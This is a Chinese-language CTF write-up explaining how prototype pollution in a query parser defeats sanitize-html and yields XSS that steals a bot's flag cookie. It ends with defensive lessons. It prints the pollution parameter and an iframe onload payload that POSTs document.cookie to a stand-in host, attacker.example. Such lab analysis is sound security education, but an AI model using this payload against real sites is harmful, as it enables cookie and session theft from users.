# L3akCTF 2025 NotoriousNote Writeup

## 题目简述

题目是一个前端记事页面。`note` 从 URL query 读取，经浏览器版 `sanitize-html` 清理后写入 `innerHTML`。举报功能会让 Selenium bot 先在 `127.0.0.1:5000` 设置可由 JavaScript 读取的 flag cookie，再访问用户提交的 URL。

单独提交事件属性会被 sanitizer 删除，但自定义 query parser 存在原型污染，可修改 sanitizer 对通配属性的判断。决定性障碍是客户端 prototype pollution 到 XSS 的数据流，本文按 Web 归档。

## 解题过程

### 定位原型污染

`QueryArg.parseQuery` 支持方括号和点号形式的嵌套键。处理：

```text
__proto__[*]=onload
```

时，`_qaAccess` 的关键逻辑为：

```javascript
obj[currentRoot] = obj[currentRoot] || [];
return QueryArg._qaAccess(obj[currentRoot], nextSelector, value);
```

`obj["__proto__"]` 原本就是 `Object.prototype`，因此不会被新数组覆盖。下一次递归最终执行：

```javascript
Object.prototype["*"] = "onload";
```

代码没有拒绝 `__proto__`、`prototype` 或 `constructor`，所以 query 参数可以污染之后创建的普通对象。

### 让 sanitizer 放行 onload

题目附带版本的 `sanitize-html` 默认允许 `iframe` 标签，但默认属性表只有：

```javascript
{
  a: ["href", "name", "target"],
  img: ["src"]
}
```

内部检查通配属性时直接访问：

```javascript
allowedAttributesMap["*"] &&
allowedAttributesMap["*"].indexOf(attributeName) !== -1
```

它没有确认 `*` 是对象自身属性。原型污染后，`allowedAttributesMap["*"]` 从 `Object.prototype` 继承到字符串 `"onload"`；当属性名也是 `onload` 时，字符串的 `indexOf` 检查通过，事件处理器被保留下来。

因此 note 可使用：

```html
<iframe onload=fetch(
  'https://attacker.example/collect',
  {method:'POST',mode:'no-cors',body:document.cookie}
)>
```

实际 URL 中应去掉示例换行，并分别 URL 编码 note 与污染键：

```text
http://127.0.0.1:5000/?note=<编码后的iframe>&__proto__%5B*%5D=onload
```

页面会先解析完整 query，再执行：

```javascript
el.innerHTML += `<div class="note-item">${sanitizeHtml(note)}</div>`;
```

所以参数先后顺序不会影响污染在 sanitize 调用前生效。

### 通过 bot 取得 cookie

向 `/report` 提交上面的内部 URL。使用 `127.0.0.1:5000` 很重要：bot 的 flag cookie 是在这个 origin 下设置的，换成攻击者站点或其他主机名时不会携带该 cookie。

bot 访问页面后，保留下来的 `iframe onload` 执行，`document.cookie` 被 POST 到攻击者接收端。cookie 的 `HttpOnly` 显式设置为 false，因此脚本可直接读取：

```text
flag=L3AK{v1b3_c0d1n9_w3nt_t00_d33p_4nd_3nd3d_1n_xss}
```

接收端只需记录请求体；具体使用哪一种临时 HTTP 日志服务并不影响漏洞原理，因此无需依赖官方示例中的外部站点。

## 方法总结

本题不是 sanitizer 自身凭空失效，而是 sanitizer 使用的普通对象被更早的 query parser 污染。任何支持 `a[b]`、点路径或递归对象赋值的解析器都应显式拒绝 `__proto__`、`prototype` 和 `constructor`，并用无原型对象保存不可信键。

安全库内部访问配置项时也应使用自身属性判断。本题对 `allowedAttributesMap["*"]` 的继承属性读取，把字符串 `"onload"` 当成通配白名单。最后，敏感 cookie 应始终设置 `HttpOnly`；即使前端出现 XSS，也能避免脚本直接读取认证秘密或 flag。
